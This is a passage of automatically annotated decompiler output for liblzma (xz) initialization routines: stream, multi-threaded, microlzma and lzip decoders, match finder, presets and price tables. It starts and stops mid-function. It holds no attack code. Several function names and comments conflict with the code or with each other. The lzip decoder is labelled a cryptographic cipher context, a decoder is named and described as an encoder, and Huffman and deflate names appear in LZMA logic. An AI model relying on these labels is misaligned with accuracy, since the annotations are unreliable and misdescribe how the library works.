    *(undefined1 (*) [16])(puVar2 + 6) = (undefined1  [16])0x0;
    *(undefined1 (*) [16])(puVar2 + 10) = (undefined1  [16])0x0;
    *(undefined1 (*) [16])(puVar2 + 0xe) = (undefined1  [16])0x0;
    *(undefined1 (*) [16])(puVar2 + 0x12) = (undefined1  [16])0x0;
  }
  else {
    uVar3 = *(undefined8 *)(puVar2 + 0x58);
  }
  if (param_3 == 0) {
    param_3 = 1;
  }
  *(char *)(puVar2 + 0x5e) = (char)param_4;
  *(byte *)(puVar2 + 0x5e) = *(byte *)(puVar2 + 0x5e) & 1;
  *(byte *)((long)puVar2 + 0x179) = (byte)(param_4 >> 1) & 1;
  *(long *)(puVar2 + 0x5a) = param_3;
  *(undefined1 *)((long)puVar2 + 0x17d) = 1;
  *(byte *)((long)puVar2 + 0x17a) = (byte)(param_4 >> 2) & 1;
  *(undefined8 *)(puVar2 + 0x5c) = 0x8000;
  *(byte *)(puVar2 + 0x5f) = (byte)(param_4 >> 3) & 1;
  *(byte *)((long)puVar2 + 0x17b) = (byte)(param_4 >> 4) & 1;
  lVar1 = lzma_index_hash_init(uVar3,param_2);
  *(long *)(puVar2 + 0x58) = lVar1;
  if (lVar1 == 0) {
    return 5;
  }
  *puVar2 = 0;
  *(undefined8 *)(puVar2 + 0x60) = 0;
  return 0;
}



/**
 * @name  lzma_stream_decoder
 * @brief Public API to initialize LZMA stream decoder for .xz files. Calls filter decoder init, then stream decoder init, sets completion flags.
 * @confidence 92%
 * @classification init
 * @address 0x00111df0
 */

/* Initializes LZMA stream decoder for .xz files */

ulong lzma_stream_decoder(long param_1,undefined8 param_2,undefined4 param_3)

{
  long lVar1;
  ulong uVar2;
  
  uVar2 = lzma_filter_decoder_initialize();
  if ((int)uVar2 == 0) {
    uVar2 = lzma_stream_decoder_init
                      (*(undefined8 *)(param_1 + 0x38),*(undefined8 *)(param_1 + 0x30),param_2,
                       param_3);
    if ((int)uVar2 == 0) {
      lVar1 = *(long *)(param_1 + 0x38);
      *(undefined1 *)(lVar1 + 0x60) = 1;
      *(undefined1 *)(lVar1 + 99) = 1;
      return uVar2;
    }
    lzma_end(param_1);
    uVar2 = uVar2 & 0xffffffff;
  }
  return uVar2;
}



/**
 * @name  lzma_stream_decoder_mt_init
 * @brief Initializes multi-threaded LZMA stream decoder. Allocates 0x6e8-byte coder, initializes pthread mutex/condvar (monotonic clock if available), sets function pointers, copies thread options, initializes filter chain and index hash.
 * @confidence 85%
 * @classification init
 * @address 0x00113bf0
 */

/* Initializes the multi-threaded LZMA stream encoder. Allocates coder state (0x6e8 bytes),
   initializes pthread mutex and condition variable (with monotonic clock if available), sets up
   function pointers for encode/end/update operations, copies options including thread counts and
   flags, initializes filter chain and index hash. */

int lzma_stream_encoder_mt_init(undefined8 *param_1,undefined8 param_2,uint *param_3)

{
  uint uVar1;
  int iVar2;
  ulong uVar3;
  long lVar4;
  undefined4 *puVar5;
  ulong uVar6;
  long in_FS_OFFSET;
  timespec local_58;
  pthread_condattr_t local_44;
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  if ((code *)param_1[2] != lzma_stream_decoder_mt_validate) {
    lzma_next_coder_end();
  }
  param_1[2] = lzma_stream_decoder_mt_validate;
  puVar5 = (undefined4 *)*param_1;
  if (puVar5 == (undefined4 *)0x0) {
    puVar5 = (undefined4 *)lzma_alloc(0x6e8);
    if (puVar5 != (undefined4 *)0x0) {
      *param_1 = puVar5;
      iVar2 = pthread_mutex_init((pthread_mutex_t *)(puVar5 + 0x8a),(pthread_mutexattr_t *)0x0);
      if (iVar2 == 0) {
        iVar2 = clock_gettime(1,&local_58);
        if (iVar2 == 0) {
          iVar2 = pthread_condattr_init(&local_44);
          if (iVar2 != 0) goto LAB_00113e3d;
          iVar2 = pthread_condattr_setclock(&local_44,1);
          if (iVar2 != 0) {
            pthread_condattr_destroy(&local_44);
            goto LAB_00113e3d;
          }
          iVar2 = pthread_cond_init((pthread_cond_t *)(puVar5 + 0x94),&local_44);
          pthread_condattr_destroy(&local_44);
          if (iVar2 != 0) goto LAB_00113e3d;
          puVar5[0xa0] = 1;
        }
        else {
LAB_00113e3d:
          puVar5[0xa0] = 0;
          iVar2 = pthread_cond_init((pthread_cond_t *)(puVar5 + 0x94),(pthread_condattr_t *)0x0);
          if (iVar2 != 0) {
            pthread_mutex_destroy((pthread_mutex_t *)(puVar5 + 0x8a));
            goto LAB_00113f28;
          }
        }
        param_1[3] = lzma_stream_decoder_mt_decode;
        param_1[4] = lzma_stream_encoder_mt_end;
        param_1[6] = FUN_00112120;
        param_1[7] = calculate_buffer_size_and_validate;
        param_1[5] = FUN_00112130;
        *(undefined1 (*) [16])(puVar5 + 2) = (undefined1  [16])0x0;
        *(undefined8 *)(puVar5 + 0x4a) = 0xffffffffffffffff;
        *(undefined8 *)(puVar5 + 4) = 0xffffffffffffffff;
        *(undefined8 *)(puVar5 + 0xa6) = 0;
        *(undefined8 *)(puVar5 + 0x6c) = 0;
        *(undefined8 *)(puVar5 + 0x74) = 0;
        *(undefined8 *)(puVar5 + 0x76) = 0;
        puVar5[0x72] = 0;
        *(undefined1 (*) [16])(puVar5 + 0x7a) = (undefined1  [16])0x0;
        *(undefined1 (*) [16])(puVar5 + 0x7e) = (undefined1  [16])0x0;
        *(undefined1 (*) [16])(puVar5 + 0x82) = (undefined1  [16])0x0;
        *(undefined1 (*) [16])(puVar5 + 0x86) = (undefined1  [16])0x0;
        *(undefined1 (*) [16])(puVar5 + 6) = (undefined1  [16])0x0;
        *(undefined1 (*) [16])(puVar5 + 10) = (undefined1  [16])0x0;
        *(undefined1 (*) [16])(puVar5 + 0xe) = (undefined1  [16])0x0;
        *(undefined1 (*) [16])(puVar5 + 0x12) = (undefined1  [16])0x0;
        goto LAB_00113c41;
      }
LAB_00113f28:
      lzma_free(puVar5,param_2);
    }
  }
  else {
LAB_00113c41:
    lzma_filters_free(puVar5 + 0x4a,param_2);
    stop_worker_threads(puVar5,param_2);
    lVar4 = *(long *)(param_3 + 0x10);
    *(undefined8 *)(puVar5 + 0x6f) = 0;
    uVar1 = param_3[4];
    *(undefined8 *)(puVar5 + 0xa8) = 0;
    puVar5[0x6e] = uVar1;
    uVar6 = 1;
    if (lVar4 != 0) {
      uVar6 = *(ulong *)(param_3 + 0x10);
    }
    lVar4 = *(long *)(param_3 + 0x12);
    *(undefined8 *)(puVar5 + 0xaa) = 0;
    uVar3 = 1;
    if (lVar4 != 0) {
      uVar3 = *(ulong *)(param_3 + 0x12);
    }
    *(undefined8 *)(puVar5 + 0xb0) = 0;
    *(undefined8 *)(puVar5 + 0xb2) = 0;
    *(ulong *)(puVar5 + 0xa4) = uVar3;
    if (uVar6 <= uVar3) {
      uVar3 = uVar6;
    }
    *(undefined8 *)(puVar5 + 0xb4) = 0;
    *puVar5 = 0;
    *(ulong *)(puVar5 + 0xa2) = uVar3;
    uVar1 = *param_3;
    *(undefined8 *)(puVar5 + 0x78) = 0;
    *(char *)(puVar5 + 0xb6) = (char)uVar1;
    *(byte *)(puVar5 + 0xb6) = *(byte *)(puVar5 + 0xb6) & 1;
    *(undefined8 *)(puVar5 + 0xb8) = 0;
    *(byte *)((long)puVar5 + 0x2d9) = (byte)(uVar1 >> 1) & 1;
    *(byte *)((long)puVar5 + 0x2da) = (byte)(uVar1 >> 2) & 1;
    *(byte *)((long)puVar5 + 0x2db) = (byte)(uVar1 >> 4) & 1;
    *(byte *)((long)puVar5 + 0x2dd) = (byte)(uVar1 >> 5) & 1;
    *(byte *)(puVar5 + 0xb7) = (byte)(uVar1 >> 3) & 1;
    uVar1 = param_3[1];
    *(undefined2 *)((long)puVar5 + 0x2de) = 1;
    puVar5[0x71] = uVar1;
    iVar2 = lzma_outq_reset(puVar5 + 0x7a,param_2);
    if (iVar2 != 0) goto LAB_00113d6d;
    lVar4 = lzma_index_hash_init(*(undefined8 *)(puVar5 + 0x6c),param_2);
    *(long *)(puVar5 + 0x6c) = lVar4;
    if (lVar4 != 0) {
      *puVar5 = 0;
      *(undefined8 *)(puVar5 + 0xb8) = 0;
      goto LAB_00113d6d;
    }
  }
  iVar2 = 5;
LAB_00113d6d:
  if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return iVar2;
}



/**
 * @name  lzma_stream_decoder_mt
 * @brief Validates MT decoder params (threads < 0x4001, flags) then initializes
 * @confidence 70%
 * @classification init
 * @address 0x00113fb0
 */

/* Validates MT decoder params then calls init */

undefined8 lzma_stream_decoder_mt_validate(undefined8 param_1,undefined8 param_2,uint *param_3)

{
  undefined8 uVar1;
  
  if ((param_3[1] - 1 < 0x4000) && ((*param_3 & 0xffffffc0) == 0)) {
    uVar1 = lzma_stream_encoder_mt_init();
    return uVar1;
  }
  return 8;
}



/**
 * @name  lzma_stream_decoder_mt_init
 * @brief Initializes multi-threaded LZMA stream decoder with thread count and flag validation.
 * @confidence 88%
 * @classification init
 * @address 0x00113fe0
 */

/* Initializes multi-threaded LZMA stream decoder with thread count and buffer size validation */

int lzma_stream_decoder_mt(long param_1,uint *param_2)

{
  long lVar1;
  int iVar2;
  
  iVar2 = lzma_filter_decoder_initialize();
  if (iVar2 != 0) {
    return iVar2;
  }
  if ((param_2[1] - 1 < 0x4000) && ((*param_2 & 0xffffffc0) == 0)) {
    iVar2 = lzma_stream_encoder_mt_init
                      (*(undefined8 *)(param_1 + 0x38),*(undefined8 *)(param_1 + 0x30),param_2);
    if (iVar2 == 0) {
      lVar1 = *(long *)(param_1 + 0x38);
      *(undefined1 *)(lVar1 + 0x60) = 1;
      *(undefined1 *)(lVar1 + 99) = 1;
      return 0;
    }
  }
  else {
    iVar2 = 8;
  }
  lzma_end(param_1);
  return iVar2;
}



/**
 * @name  lzma_microlzma_decoder
 * @brief Initializes MicroLZMA decoder: sets up filter decoder, initializes via index_encoder_init, marks completion flags.
 * @confidence 85%
 * @classification init
 * @address 0x00114420
 */

/* Initializes and runs micro LZMA decoder. Sets up filter decoder, initializes index encoder, and
   marks completion flags on success. */

ulong lzma_microlzma_decoder
                (long param_1,undefined8 param_2,undefined8 param_3,char param_4,undefined4 param_5)

{
  long lVar1;
  ulong uVar2;
  
  uVar2 = lzma_filter_decoder_initialize();
  if ((int)uVar2 == 0) {
    uVar2 = lzma_index_encoder_init
                      (*(undefined8 *)(param_1 + 0x38),*(undefined8 *)(param_1 + 0x30),param_2,
                       param_3,param_4 != '\0',param_5);
    if ((int)uVar2 == 0) {
      lVar1 = *(long *)(param_1 + 0x38);
      *(undefined1 *)(lVar1 + 0x60) = 1;
      *(undefined1 *)(lVar1 + 99) = 1;
      return uVar2;
    }
    lzma_end(param_1);
    uVar2 = uVar2 & 0xffffffff;
  }
  return uVar2;
}



/**
 * @name  lzma_lzip_decoder_init
 * @brief Initializes lzip format decoder: allocates 0x118-byte state, sets up decoder/end callbacks, extracts flag bits.
 * @confidence 78%
 * @classification init
 * @address 0x001144f0
 */

/* Initializes a cryptographic cipher context with memory allocation, callback setup, and parameter
   configuration based on flags */

uint cipher_context_init(undefined8 *param_1,undefined8 param_2,long param_3,ulong param_4)

{
  undefined4 *puVar1;
  
  if ((code *)param_1[2] != cipher_context_init) {
    lzma_next_coder_end();
  }
  param_1[2] = cipher_context_init;
  if ((param_4 & 0xffffffc0) == 0) {
    puVar1 = (undefined4 *)*param_1;
    if (puVar1 == (undefined4 *)0x0) {
      puVar1 = (undefined4 *)lzma_alloc(0x118,param_2);
      if (puVar1 == (undefined4 *)0x0) {
        return 5;
      }
      *param_1 = puVar1;
      param_1[3] = lzip_decoder_run;
      param_1[4] = lzma_lzip_decoder_end;
      param_1[6] = FUN_001144b0;
      param_1[7] = lzma_vli_get;
      *(undefined1 (*) [16])(puVar1 + 0x32) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(puVar1 + 0x36) = (undefined1  [16])0x0;
      *(undefined8 *)(puVar1 + 0x34) = 0xffffffffffffffff;
      *(undefined1 (*) [16])(puVar1 + 0x3a) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(puVar1 + 0x3e) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(puVar1 + 0x42) = (undefined1  [16])0x0;
    }
    *(undefined1 *)((long)puVar1 + 0x33) = 1;
    if (param_3 == 0) {
      param_3 = 1;
    }
    *puVar1 = 0;
    *(undefined8 *)(puVar1 + 10) = 0x8000;
    *(long *)(puVar1 + 8) = param_3;
    *(byte *)(puVar1 + 0xc) = (byte)(param_4 >> 2) & 1;
    *(undefined8 *)(puVar1 + 0xe) = 0;
    *(byte *)((long)puVar1 + 0x32) = (byte)((uint)param_4 >> 3) & 1;
    *(byte *)((long)puVar1 + 0x31) = (byte)((param_4 & 0xffffffff) >> 4) & 1;
    return (uint)param_4 & 0xffffffc0;
  }
  return 8;
}



/**
 * @name  lzma_check_init
 * @brief Initializes integrity check state: CRC32=0, CRC64=0, SHA256=init
 * @confidence 90%
 * @classification init
 * @address 0x00114b10
 */

/* Initializes check state based on type (1=CRC32, 4=CRC64, 10=SHA256) */

void lzma_check_init(long param_1,int param_2)

{
  if (param_2 == 4) {
    *(undefined8 *)(param_1 + 0x40) = 0;
    return;
  }
  if (param_2 != 10) {
    if (param_2 != 1) {
      return;
    }
    *(undefined4 *)(param_1 + 0x40) = 0;
    return;
  }
  lzma_sha256_init();
  return;
}



/**
 * @name  lzma_lz_encoder_mf_init
 * @brief Initializes LZ match finder state. Selects strategy (hash chain/binary tree) via function pointers, computes hash/son buffer sizes from dictionary size, sets depth parameter, reallocates buffers when sizes change.
 * @confidence 80%
 * @classification init
 * @address 0x001168e0
 */

/* Initializes LZ match finder state based on algorithm options. Selects match finding strategy
   (hash chain, binary tree, or huffman-based) via function pointers, computes hash table and son
   buffer sizes based on dictionary size, handles hash mask calculation (round to power-of-two minus
   1, capped at 0xFFFFFF), and sets depth parameter. Frees and reallocates internal buffers when
   sizes change. */

undefined8 lzma_stream_init_state(long *param_1,undefined8 param_2,long *param_3)

{
  uint uVar1;
  ulong uVar2;
  ulong uVar3;
  long lVar4;
  long lVar5;
  long lVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  ulong uVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  uint uVar14;
  
  uVar2 = param_3[1];
  if (0x5ffff000 < uVar2 - 0x1000) {
    return 1;
  }
  uVar3 = param_3[3];
  uVar10 = param_3[4];
  if (uVar3 < uVar10) {
    return 1;
  }
  lVar4 = *param_3;
  lVar5 = param_3[2];
  iVar7 = (int)uVar2;
  lVar6 = param_1[1];
  iVar13 = iVar7 + (int)lVar4;
  iVar11 = (int)uVar3;
  iVar12 = iVar11 + (int)lVar5;
  *(int *)((long)param_1 + 0xc) = iVar13;
  *(int *)(param_1 + 2) = iVar12;
  iVar12 = (int)(uVar3 + lVar4 + lVar5 >> 1) + (int)(uVar2 >> 1) + iVar13 + 0x80000 + iVar12;
  *(int *)(param_1 + 1) = iVar12;
  if ((*param_1 != 0) && (iVar12 != (int)lVar6)) {
    lzma_free(*param_1,param_2);
    *param_1 = 0;
    iVar11 = (int)param_3[3];
    uVar10 = param_3[4];
    iVar7 = (int)param_3[1];
  }
  uVar1 = *(uint *)(param_3 + 5);
  *(int *)(param_1 + 0xc) = (int)uVar10;
  iVar12 = iVar7 + 1;
  *(int *)((long)param_1 + 100) = iVar11;
  *(int *)((long)param_1 + 0x54) = iVar12;
  switch(uVar1) {
  case 3:
    param_1[6] = (long)lz_find_match;
    param_1[7] = (long)lz77_match_update_hash_chain;
    break;
  case 4:
    param_1[6] = (long)lzma_find_matches_fast;
    param_1[7] = (long)deflate_compress_block;
    break;
  default:
    return 1;
  case 0x12:
    iVar11 = *(int *)((long)param_1 + 0x6c);
    *(undefined4 *)(param_1 + 0xb) = 0xffff;
    uVar14 = 0x10;
    *(undefined4 *)((long)param_1 + 0x6c) = 0x10000;
    iVar7 = (int)param_1[0xe];
    param_1[6] = (long)lzma_huffman_decode;
    param_1[7] = (long)lzma_huffman_decode_symbol;
    iVar13 = 0x10000;
    goto LAB_001169ed;
  case 0x13:
    uVar14 = 0x10;
    param_1[6] = (long)lzma_mf_hc3_find;
    param_1[7] = (long)FUN_00117d80;
    uVar8 = iVar7 - 1U | iVar7 - 1U >> 1;
    uVar8 = uVar8 | uVar8 >> 2;
    uVar8 = uVar8 | uVar8 >> 4;
    uVar8 = (uVar8 | uVar8 >> 8) >> 1 | 0xffff;
    if (0x1000000 < uVar8) goto LAB_00116b98;
LAB_00116be0:
    *(uint *)(param_1 + 0xb) = uVar8;
    uVar14 = 0x10;
    goto LAB_00116b3d;
  case 0x14:
    param_1[6] = (long)lzma_find_matches_optimal;
    param_1[7] = (long)lzma_lz_compress_step;
    uVar8 = iVar7 - 1U | iVar7 - 1U >> 1;
    uVar8 = uVar8 | uVar8 >> 2;
    uVar8 = uVar8 | uVar8 >> 4;
    uVar8 = (uVar8 | uVar8 >> 8) >> 1 | 0xffff;
    if (uVar8 < 0x1000001) goto LAB_00116be0;
    uVar14 = 0x10;
    uVar9 = 4;
    goto LAB_00116ab1;
  }
  uVar9 = uVar1 & 0xf;
  uVar14 = uVar1 & 0x10;
  uVar8 = iVar7 - 1U | iVar7 - 1U >> 1;
  uVar8 = uVar8 | uVar8 >> 2;
  uVar8 = uVar8 >> 4 | uVar8;
  uVar8 = (uVar8 >> 8 | uVar8) >> 1 | 0xffff;
  if (uVar8 < 0x1000001) {
    *(uint *)(param_1 + 0xb) = uVar8;
LAB_00116b3d:
    iVar13 = uVar8 + 0x401;
  }
  else if (uVar9 == 3) {
LAB_00116b98:
    *(undefined4 *)(param_1 + 0xb) = 0xffffff;
    iVar13 = 0x1000400;
  }
  else {
LAB_00116ab1:
    uVar8 = uVar8 >> 1;
    *(uint *)(param_1 + 0xb) = uVar8;
    if (2 < uVar9) goto LAB_00116b3d;
    iVar13 = uVar8 + 1;
  }
  iVar11 = *(int *)((long)param_1 + 0x6c);
  if ((uVar1 & 0xc) != 0) {
    iVar13 = iVar13 + 0x10000;
  }
  iVar7 = (int)param_1[0xe];
  *(int *)((long)param_1 + 0x6c) = iVar13;
  if (uVar14 != 0) {
LAB_001169ed:
    iVar12 = iVar12 * 2;
  }
  *(int *)(param_1 + 0xe) = iVar12;
  if ((iVar13 != iVar11) || (iVar7 != (int)param_1[0xe])) {
    lzma_free(param_1[8],param_2);
    param_1[8] = 0;
    lzma_free(param_1[9],param_2);
    param_1[9] = 0;
  }
  iVar11 = *(int *)((long)param_3 + 0x2c);
  *(int *)((long)param_1 + 0x5c) = iVar11;
  if (iVar11 == 0) {
    if (uVar14 == 0) {
      *(uint *)((long)param_1 + 0x5c) = (*(uint *)(param_1 + 0xc) >> 2) + 4;
    }
    else {
      *(uint *)((long)param_1 + 0x5c) = (*(uint *)(param_1 + 0xc) >> 1) + 0x10;
    }
  }
  return 0;
}



/**
 * @name  lzma_lzma_decoder_init
 * @brief Initializes LZMA decoder context: allocates 0xf0-byte state, sets function pointers for stream decoding, initializes probability tables and dictionary, copies preset dictionary, chains to sub-filter.
 * @confidence 88%
 * @classification init
 * @address 0x00116ce0
 */

/* Initializes LZMA decoder context: allocates decoder state structure, sets up function pointers
   for stream decoding, initializes probability tables and dictionary buffer, copies preset
   dictionary if provided, and chains to sub-filter initialization. */

undefined8
lzma_decoder_init(undefined8 *param_1,undefined8 param_2,undefined8 *param_3,code *param_4)

{
  uint uVar1;
  char cVar2;
  undefined8 uVar3;
  undefined8 *puVar4;
  long lVar5;
  size_t __n;
  long in_FS_OFFSET;
  undefined1 auStack_78 [48];
  long local_48;
  uint local_40;
  long local_30;
  
  puVar4 = (undefined8 *)*param_1;
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  if (puVar4 == (undefined8 *)0x0) {
    puVar4 = (undefined8 *)lzma_alloc(0xf0);
    if (puVar4 != (undefined8 *)0x0) {
      *param_1 = puVar4;
      param_1[3] = stream_decode_process;
      param_1[4] = lzma_lzma_encoder_end;
      param_1[8] = lzma_lzma_coder_code;
      param_1[9] = lzma_lzma_encoder_get_check;
      *(undefined1 (*) [16])(puVar4 + 0x14) = (undefined1  [16])0x0;
      *puVar4 = 0;
      puVar4[1] = 0;
      puVar4[2] = 0;
      puVar4[3] = 0;
      puVar4[4] = 0;
      puVar4[5] = 0;
      *(undefined4 *)(puVar4 + 6) = 0;
      puVar4[0xd] = 0;
      puVar4[0xe] = 0;
      *(undefined8 *)((long)puVar4 + 0x94) = 0;
      puVar4[0x15] = 0xffffffffffffffff;
      *(undefined1 (*) [16])(puVar4 + 0x16) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(puVar4 + 0x18) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(puVar4 + 0x1a) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(puVar4 + 0x1c) = (undefined1  [16])0x0;
      goto LAB_00116d15;
    }
LAB_00116f63:
    uVar3 = 5;
  }
  else {
LAB_00116d15:
    uVar3 = (*param_4)(puVar4,param_2,*param_3,param_3[2],auStack_78);
    if ((int)uVar3 != 0) goto LAB_00116d30;
    cVar2 = lzma_stream_init_state(puVar4 + 5,param_2,auStack_78);
    uVar3 = 8;
    if (cVar2 != '\0') goto LAB_00116d30;
    if (puVar4[5] == 0) {
      lVar5 = lzma_alloc(*(int *)(puVar4 + 6) + 8);
      puVar4[5] = lVar5;
      if (lVar5 == 0) goto LAB_00116f63;
      *(undefined8 *)(lVar5 + (ulong)*(uint *)(puVar4 + 6)) = 0;
    }
    puVar4[8] = 0;
    puVar4[9] = 0;
    *(undefined4 *)((long)puVar4 + 0x3c) = *(undefined4 *)((long)puVar4 + 0x7c);
    __n = (ulong)*(uint *)((long)puVar4 + 0x94) << 2;
    *(undefined4 *)(puVar4 + 10) = 0;
    if ((void *)puVar4[0xd] == (void *)0x0) {
      uVar3 = lzma_alloc_zero(__n,param_2);
      puVar4[0xd] = uVar3;
      lVar5 = lzma_alloc((ulong)*(uint *)(puVar4 + 0x13) << 2,param_2);
      puVar4[0xe] = lVar5;
      if ((puVar4[0xd] == 0) || (lVar5 == 0)) {
        lzma_free(puVar4[0xd],param_2);
        puVar4[0xd] = 0;
        lzma_free(puVar4[0xe],param_2);
        puVar4[0xe] = 0;
        goto LAB_00116f63;
      }
    }
    else {
      memset((void *)puVar4[0xd],0,__n);
    }
    *(undefined4 *)(puVar4 + 0xf) = 0;
    if (local_48 != 0) {
      if (local_40 != 0) {
        uVar1 = local_40;
        if (*(uint *)(puVar4 + 6) <= local_40) {
          uVar1 = *(uint *)(puVar4 + 6);
        }
        *(uint *)((long)puVar4 + 0x4c) = uVar1;
        memcpy((void *)puVar4[5],(void *)(local_48 + ((ulong)local_40 - (ulong)uVar1)),(ulong)uVar1)
        ;
        *(undefined4 *)(puVar4 + 0x12) = 1;
        (*(code *)puVar4[0xc])(puVar4 + 5,*(undefined4 *)((long)puVar4 + 0x4c));
      }
    }
    *(undefined4 *)(puVar4 + 0x12) = 0;
    uVar3 = set_filter_and_init(puVar4 + 0x14,param_2,param_3 + 3);
  }
LAB_00116d30:
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_lzma_decoder_init
 * @brief Initializes LZMA decoder: allocates 0x10c0-byte coder structure, sets function pointers for decode/cleanup, calls specific LZ init, allocates dictionary buffer (16-byte aligned with 0x240 header), copies preset dictionary, chains to sub-filter init.
 * @confidence 85%
 * @classification init
 * @address 0x00118570
 */

/* Initializes an LZ decoder structure. Allocates the coder structure (0x10c0 bytes) if needed, sets
   up function pointers for decode and cleanup, calls the specific LZ init function, allocates the
   dictionary buffer (aligned to 16 bytes with 0x240 header), copies preset dictionary data, and
   initializes the filter chain. */

undefined8 lzma_lz_decoder_init(long *param_1,undefined8 param_2,undefined8 *param_3,code *param_4)

{
  long lVar1;
  undefined8 uVar2;
  long lVar3;
  long *plVar4;
  ulong __n;
  long in_FS_OFFSET;
  ulong local_48;
  long local_40;
  ulong local_38;
  long local_30;
  
  plVar4 = (long *)*param_1;
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  if (plVar4 == (long *)0x0) {
    plVar4 = (long *)lzma_alloc(0x10c0);
    if (plVar4 != (long *)0x0) {
      *param_1 = (long)plVar4;
      param_1[3] = (long)buffered_decode_process;
      param_1[4] = (long)lzma_lzma_decoder_end;
      *(undefined1 (*) [16])(plVar4 + 0xb) = (undefined1  [16])0x0;
      *plVar4 = 0;
      plVar4[4] = 0;
      plVar4[6] = 0;
      plVar4[7] = 0;
      plVar4[8] = 0;
      plVar4[9] = 0;
      plVar4[10] = 0;
      plVar4[0xc] = -1;
      *(undefined1 (*) [16])(plVar4 + 0xd) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(plVar4 + 0xf) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(plVar4 + 0x11) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(plVar4 + 0x13) = (undefined1  [16])0x0;
      goto LAB_001185a8;
    }
LAB_001186b4:
    uVar2 = 5;
  }
  else {
LAB_001185a8:
    uVar2 = (*param_4)(plVar4 + 6,param_2,*param_3,param_3[2],&local_48);
    if ((int)uVar2 != 0) goto LAB_00118684;
    if (local_48 < 0x1000) {
      local_48 = 0x1000;
    }
    else if (0xfffffffffffffdb0 < local_48) goto LAB_001186b4;
    local_48 = local_48 + 0xf & 0xfffffffffffffff0;
    lVar1 = local_48 + 0x240;
    if (plVar4[4] != lVar1) {
      lzma_free(*plVar4,param_2);
      lVar3 = lzma_alloc(lVar1,param_2);
      *plVar4 = lVar3;
      if (lVar3 == 0) goto LAB_001186b4;
      plVar4[4] = lVar1;
    }
    param_1 = (long *)*param_1;
    param_1[1] = 0x240;
    param_1[2] = 0;
    *(undefined1 *)(*param_1 + 0x23f) = 0;
    *(undefined2 *)(param_1 + 5) = 0;
    if ((local_40 != 0) && (local_38 != 0)) {
      __n = local_38;
      if (local_48 <= local_38) {
        __n = local_48;
      }
      memcpy((void *)(plVar4[1] + *plVar4),(void *)(local_40 + (local_38 - __n)),__n);
      plVar4[1] = plVar4[1] + __n;
      plVar4[2] = __n;
    }
    *(undefined2 *)(plVar4 + 0x15) = 0;
    plVar4[0x16] = 0;
    plVar4[0x17] = 0;
    uVar2 = set_filter_and_init(plVar4 + 0xb,param_2,param_3 + 3);
  }
LAB_00118684:
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_lzma_preset
 * @brief Initializes LZMA compression options from preset level (0-9). Configures dict size, match finder, nice length, depth.
 * @confidence 92%
 * @classification init
 * @address 0x001187a0
 */

/* Initializes LZMA compression options structure based on preset level (0-9) and flags. Configures
   dictionary size, match finder, nice length, and depth parameters. */

undefined8 lzma_lzma_preset(int *param_1,uint param_2)

{
  uint uVar1;
  int iVar2;
  undefined8 uVar3;
  
  uVar3 = 1;
  uVar1 = param_2 & 0x1f;
  if ((uVar1 < 10) && ((param_2 & 0x7fffffe0) == 0)) {
    param_1[2] = 0;
    param_1[3] = 0;
    param_1[4] = 0;
    param_1[5] = 3;
    param_1[6] = 0;
    param_1[7] = 2;
    *param_1 = 1 << ((&DAT_00128c50)[uVar1] & 0x1f);
    if ((param_2 & 0x1c) == 0) {
      param_1[8] = 1;
      param_1[10] = (uVar1 != 0) + 3;
      param_1[9] = (-(uint)((param_2 & 0x1e) == 0) & 0xffffff6f) + 0x111;
      param_1[0xb] = (uint)(byte)(&DAT_00128c48)[uVar1];
    }
    else {
      param_1[8] = 2;
      param_1[10] = 0x14;
      iVar2 = 0x10;
      if (uVar1 != 4) {
        iVar2 = 0x20;
        if (uVar1 != 5) {
          iVar2 = 0x40;
        }
      }
      param_1[9] = iVar2;
      param_1[0xb] = 0;
    }
    uVar3 = 0;
    if ((int)param_2 < 0) {
      uVar3 = 0;
      param_1[8] = 2;
      param_1[10] = 0x14;
      if ((uVar1 - 3 & 0xfffffffd) == 0) {
        param_1[9] = 0xc0;
        param_1[0xb] = 0;
      }
      else {
        param_1[9] = 0x111;
        param_1[0xb] = 0x200;
      }
    }
  }
  return uVar3;
}



/**
 * @name  lzma_literal_price_init
 * @brief Initializes LZMA literal encoding price tables. Computes cumulative bit costs from probability tables using a lookup table that maps probabilities to approximate bit costs for three literal coding contexts.
 * @confidence 85%
 * @classification init
 * @address 0x001188c0
 */

/* Initializes price/cost tables for LZMA literal encoding. Computes cumulative bit costs from
   probability tables using a lookup table (prob_price_table) that maps probabilities to approximate bit
   costs. Handles three literal coding contexts: normal, match-literal with match byte, and
   match-literal without match byte. */

void lzma_literal_price_init(ushort *param_1,ulong param_2)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  byte bVar4;
  ushort uVar5;
  uint uVar6;
  uint uVar7;
  ulong uVar8;
  ushort *puVar9;
  int iVar10;
  uint uVar11;
  uint uVar12;
  ushort *puVar13;
  
  param_2 = param_2 & 0xffffffff;
  uVar5 = *param_1;
  uVar6 = *(uint *)(param_1 + 0x2402);
  *(uint *)(param_1 + param_2 * 2 + 0x2404) = uVar6;
  bVar1 = (&prob_price_table)[uVar5 >> 4];
  bVar2 = (&prob_price_table)[uVar5 >> 4 ^ 0x7f];
  puVar9 = param_1 + param_2 * 0x220 + 0x202;
  bVar3 = (&prob_price_table)[param_1[1] >> 4];
  bVar4 = (&prob_price_table)[param_1[1] >> 4 ^ 0x7f];
  if (uVar6 != 0) {
    uVar11 = 0;
    puVar13 = puVar9;
    do {
      iVar10 = 0;
